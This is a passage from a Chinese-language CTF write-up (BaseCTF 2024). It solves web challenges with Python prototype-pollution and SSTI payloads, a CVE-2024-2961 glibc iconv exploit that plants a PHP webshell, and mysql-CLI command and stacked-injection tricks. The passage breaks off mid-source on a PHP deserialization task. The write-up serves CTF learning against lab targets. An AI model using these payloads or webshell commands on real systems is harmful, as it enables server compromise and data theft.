class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(json.<span class="title function_ invoke__">loads</span>(request.data), instance)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;这个魔术还行吧&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我要json的魔术&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure><p>​可以看到<code>&#123;</code>和<code>&#125;</code>都被过滤了，但很明显存在原型链污染漏洞，将全局变量BLACKLIST_IN_index给修改掉就可以SSTI注入了</p><p>​原型链污染的payload为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /magic HTTP/<span class="number">1.1</span></span><br><span class="line">Host: challenge.basectf.fun:<span class="number">30509</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">113.0</span><span class="number">.5672</span><span class="number">.93</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">76</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​原型链污染后，过滤就没有了，此时就可以进行无过滤SSTI了</p><p>​用焚靖生成一个payload：<code>&#123;&#123;cycler.next.__globals__.__builtins__.__import__('os').popen('cat /flag').read()&#125;&#125;</code></p><h2 id="Just-Readme-前置"><a href="#Just-Readme-前置" class="headerlink" title="Just Readme (前置)"></a>Just Readme (前置)</h2><h3 id="题目描述-24"><a href="#题目描述-24" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>​仍然是执行 <code>/readflag</code></p><h3 id="考点-24"><a href="#考点-24" class="headerlink" title="考点"></a>考点</h3><ul><li>CVE-2024-2961</li></ul><h3 id="题解-24"><a href="#题解-24" class="headerlink" title="题解"></a>题解</h3><p>​对于这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​存在glibc的iconv（）中的缓冲区溢出漏洞（CVE-2024-2961）</p><p>​复现博客<a href="https://blog.csdn.net/kjdfklha/article/details/139450835">CVE-2024-2961复现-CSDN博客</a></p><p>​影响PHP 7.0.0 (2015) 到 8.3.7 (2024)，file_get_contents()、file()、readfile()、fgets()、getimagesize()、SplFileObject-&gt;read()等</p><p>​引用晨曦✌的博客：</p><p>​基本原理就是 iconv 在转换 ISO-2022-CN-EXT 时出现越界写入，<code>iconv</code> 是 <code>php://filter/</code> 使用过滤器时会使用的函数，后边就是pwn的知识了。</p><p>​更简单的流程就是，先读出php所使用的 libc 和所使用堆的基地址，然后通过缓冲区溢出的越界写入，实现地址覆盖，调用 libc 里面的函数， 从而rce。</p><p>​原始<a href="https://github.com/ambionics/cnext-exploits">EXP</a>下载，将第62行修改为<code>data = response.re.search(b&quot;(.*)&quot;, flags=re.S).group(1)</code>即可</p><p>​运行exp：<code>python cnext-exploit.py http://gz.imxbt.cn:20358/ &quot;echo &#39;&lt;?php eval(\$_GET[6]);?&gt;&#39; &gt; hack.php&quot;</code>即可写入木马，访问<code>hack.php?6=system(&quot;/readflag&quot;);</code>即可</p><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><h3 id="题目描述-25"><a href="#题目描述-25" class="headerlink" title="题目描述"></a>题目描述</h3><p>​我要读 flag 啦~ 欸，但是没有回显可怎么办？</p><p>​请执行 <code>/readflag</code></p><p>​如果你在用神奇脚本的话需要改改哦~</p><h3 id="考点-25"><a href="#考点-25" class="headerlink" title="考点"></a>考点</h3><ul><li>CVE-2024-2961</li></ul><h3 id="题解-25"><a href="#题解-25" class="headerlink" title="题解"></a>题解</h3><p>​相比于<code>Just Readme(前置)</code>，这个题没有了回显，尝试运行之前的exp，返回</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[-] Remote.download did <span class="keyword">not</span> <span class="keyword">return</span> the test string</span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line">Expected test string: b<span class="string">&#x27;2FancwkqtVnShWtBdZWZZcWjvGbUgvEHczEkmmlVqe7yOwjD7W&#x27;</span></span><br><span class="line">Got: b<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line">[-] <span class="keyword">If</span> your code works fine, it means that the data:// <span class="keyword">wrapper</span> does <span class="keyword">not</span> <span class="keyword">work</span></span><br></pre></td></tr></table></figure><p>​官方WP说将第62行换成<code>data = response.text</code>即可，但是我这边并没有成功，也可能是复现环境的问题</p><h2 id="Lucky-Number"><a href="#Lucky-Number" class="headerlink" title="Lucky Number"></a>Lucky Number</h2><h3 id="题目描述-26"><a href="#题目描述-26" class="headerlink" title="题目描述"></a>题目描述</h3><p>​原型链污染的大手可以伸很长的哦</p><h3 id="考点-26"><a href="#考点-26" class="headerlink" title="考点"></a>考点</h3><ul><li>原型链污染</li><li>SSTI模板注入</li></ul><h3 id="题解-26"><a href="#题解-26" class="headerlink" title="题解"></a>题解</h3><p>​访问根路由，提示：<code>都进题了，愣着干嘛，想要flag的话，那你去/flag啊！</code></p><p>​访问<code>/flag</code>路由，提示<code>你不会以为这里真的有flag吧？想要flag的话先提交我的幸运数字5346，但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了，但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法，下面是前人留下来的信息，希望对你有用</code>以及部分源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> heaven</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">BLACKLIST_IN_index = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_json</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/m4G1c&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollute</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            result = heaven.create()</span><br><span class="line">            message = result[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;这个魔术还行吧</span></span><br><span class="line"><span class="string">&quot;</span> + message</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我要json的魔术&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;记得用POST方法把魔术交上来&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#heaven.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">kon=<span class="string">&quot;Kon&quot;</span>, pure=<span class="string">&quot;Pure&quot;</span>, *, confirm=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> create.__kwdefaults__:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: <span class="string">&quot;nope&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> <span class="keyword">in</span> create.__kwdefaults__:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="string">&quot;lucky_number&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;你有什么想创造的吗？&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: <span class="string">&quot;nope&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>​需要借助<code>__kwdefaults__</code>污染<code>heaven.py</code>下<code>create</code>类的<code>lucky_number</code>，因为导入了<code>heaven</code>模块，所以直接在<code>__init__.__globals__</code>中就可以找到，在<code>heaven</code>模块下，存在<code>create</code>类，再利用<code>__kwdefaults__</code>修改<code>confirm</code>和<code>lucky_number</code>即可</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;heaven&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;create&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__kwdefaults__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;confirm&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;lucky_number&quot;</span><span class="punctuation">:</span><span class="string">&quot;5346&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​官方给出的污染链则是</p><p>​没有导入sys模块，则通过json模块下的<code>__spec__</code>内置属性，通过<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到sys模块，再进一步获取到heaven模块</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;json&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;__spec__&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                                    <span class="string">&quot;heaven&quot;</span> : &#123;</span><br><span class="line">                                        <span class="string">&quot;create&quot;</span> : &#123;</span><br><span class="line">                                              <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                                              <span class="string">&quot;confirm&quot;</span> : <span class="type">true</span>,</span><br><span class="line">                                              <span class="string">&quot;lucky_number&quot;</span> : &quot;5346&quot;</span><br><span class="line">                                             &#125; </span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​污染成功后，提示我们访问<code>/check</code>路由，如果达成污染目标，则提示：<code>太好了，你拿到我的幸运数字了，已经帮你把黑名单清空了，快去/ssSstTti1注入吧</code>，然后再访问<code>/ssSstTti1</code>进行一个无过滤SSTI即可</p><p>​Payload：<code>&#123;&#123;cycler.next.__globals__.__builtins__.__import__('os').popen('cat /flag').read()&#125;&#125;</code></p><h2 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h2><h3 id="题目描述-27"><a href="#题目描述-27" class="headerlink" title="题目描述"></a>题目描述</h3><p>​不可能有SQL注入，RCE好像也不太可能</p><p>​R! C! E!</p><p>​mysql远程连接和命令行操作是不是有些区别呢</p><p>​输个问号看看?</p><h3 id="考点-27"><a href="#考点-27" class="headerlink" title="考点"></a>考点</h3><ul><li>RCE</li><li>换行绕过</li><li>SQL的system关键字</li></ul><h3 id="题解-27"><a href="#题解-27" class="headerlink" title="题解"></a>题解</h3><p>​题目给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/se|ec|;|@|del|into|outfile/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有sql注入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><p>​提示输入问号，在mysql命令行中输入，可以看到</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">?         (\?) Synonym <span class="keyword">for</span> <span class="symbol">`help&#x27;</span>.</span><br><span class="line"><span class="keyword">clear</span>     (\c) <span class="keyword">Clear</span> the current <span class="keyword">input</span> statement.</span><br><span class="line">connect   (\r) Reconnect to the server. Optional arguments are <span class="keyword">db</span> and host.</span><br><span class="line">delimiter (\<span class="keyword">d</span>) <span class="keyword">Set</span> statement delimiter.</span><br><span class="line">ego       (\<span class="keyword">G</span>) Send command to mysql server, <span class="keyword">display</span> result vertically.</span><br><span class="line"><span class="keyword">exit</span>      (\q) <span class="keyword">Exit</span> mysql. Same <span class="keyword">as</span> quit.</span><br><span class="line">go        (\<span class="keyword">g</span>) Send command to mysql server.</span><br><span class="line"><span class="keyword">help</span>      (\<span class="keyword">h</span>) <span class="keyword">Display</span> this <span class="keyword">help</span>.</span><br><span class="line">notee     (\t) Don&#x27;t write into <span class="keyword">outfile</span>.</span><br><span class="line"><span class="keyword">print</span>     (\p) <span class="keyword">Print</span> current command.</span><br><span class="line">prompt    (\R) Change your mysql prompt.</span><br><span class="line">quit      (\q) Quit mysql.</span><br><span class="line">rehash    (\#) Rebuild completion hash.</span><br><span class="line">source    (\.) Execute <span class="keyword">an</span> SQL script <span class="keyword">file</span>. Takes a <span class="keyword">file</span> name <span class="keyword">as</span> <span class="keyword">an</span> argument.</span><br><span class="line">status    (\s) Get status information from the server.</span><br><span class="line">system    (\!) Execute a system <span class="keyword">shell</span> command.</span><br><span class="line">tee       (\T) <span class="keyword">Set</span> <span class="keyword">outfile</span> [to_outfile]. <span class="keyword">Append</span> everything into given <span class="keyword">outfile</span>.</span><br><span class="line"><span class="keyword">use</span>       (\<span class="keyword">u</span>) <span class="keyword">Use</span> another database. Takes database name <span class="keyword">as</span> argument.</span><br><span class="line">charset   (\C) Switch to another charset. Might be needed <span class="keyword">for</span> processing binlog with multi-byte charsets.</span><br><span class="line">warnings  (\W) Show warnings after every statement.</span><br><span class="line">nowarning (\w) Don&#x27;t show warnings after every statement.</span><br></pre></td></tr></table></figure><p>​应该是在提示我们使用某一个方法，推测应该需要用到system进行RCE</p><p>​使用换行符<code>%0a</code>绕过<code>--</code>注释符，即可利用<code>system</code>进行RCE，在目录中没有找到flag，最后发现在环境变量里</p><p>​paylaod：<code>?sql=%0asystem%20env</code></p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_fin_rce_0.png" alt="basectf2024_fin_rce_0"></p><h2 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql Inject or RCE"></a>Sql Inject or RCE</h2><h3 id="题目描述-28"><a href="#题目描述-28" class="headerlink" title="题目描述"></a>题目描述</h3><p>​不可能有RCE，SQL注入好像也不太可能</p><h3 id="考点-28"><a href="#考点-28" class="headerlink" title="考点"></a>考点</h3><ul><li>堆叠注入</li></ul><h3 id="题解-28"><a href="#题解-28" class="headerlink" title="题解"></a>题解</h3><p>​题目给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/se|ec|st|;|@|delete|into|outfile/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有sql注入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;ctfer! You can\\&#x27;t succeed this time! hahaha&#x27;; -- &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><p>​相比于<code>RCE or Sql Inject</code>，过滤了st，无法RCE了，这道题应该是SQL注入</p><p>​将<code>del</code>的过滤改成了<code>delect</code>，搜索<code>del</code>开头的关键字</p><p>​注意到有<code>delimiter</code>，它的作用是标志SQL语句的结束，正常来说，因为<code>;</code>被过滤了，无法进行堆叠注入，而通过修改SQL语句的结束标志，就可以绕过这个过滤，达成堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delimiter aaa  # 将结束符修改为aaa</span><br><span class="line">handler flag <span class="keyword">open</span> aaa  # 使用handler代替<span class="keyword">select</span>读取flag，由<span class="keyword">only</span> <span class="keyword">on</span> <span class="keyword">sql</span>推测flag在ctf.flag</span><br><span class="line">handler flag read next aaa  # <span class="keyword">first</span>被过滤，使用next </span><br></pre></td></tr></table></figure><p>payload: <code>%0adelimiter%20aaa%0ahandler%20flag%20open%20aaa%20handler%20flag%20read%20next%20aaa</code></p><h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><h3 id="题目描述-29"><a href="#题目描述-29" class="headerlink" title="题目描述"></a>题目描述</h3><p>​php 能有什么难题（</p><h3 id="考点-29"><a href="#考点-29" class="headerlink" title="考点"></a>考点</h3><ul><li>php反序列化</li><li>特殊变量传参</li><li>GC回收机制</li><li>引用绕过</li><li>字符串逃逸</li></ul><h3 id="题解-29"><a href="#题解-29" class="headerlink" title="题解"></a>题解</h3><p>​题目给到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span 